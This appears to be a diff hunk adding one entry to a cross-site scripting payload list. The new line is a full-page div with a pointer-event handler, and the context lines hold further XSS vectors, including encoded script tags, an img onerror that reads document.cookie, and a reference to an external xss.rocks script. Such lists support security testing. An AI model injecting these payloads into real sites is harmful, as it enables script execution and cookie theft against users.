@@ -154,6 +154,7 @@ http://xss.rocks/xss.js
 %3cscript%3ealert%28123%29%3c%2fscript%3e
         <iframe src=http://></iframe>
 	<img src=x onerror="&#97&#108&#101&#114&#116&#96&#120&#115&#115&#96">
+	<div onpointerrawupdate=alert(1) style=width:100%;height:100%;position:absolute;background-color:red>test
 	**DOM BASED XSS**
 		<img src="" />
 		<img src="" onerror="alert(document.cookie)" />
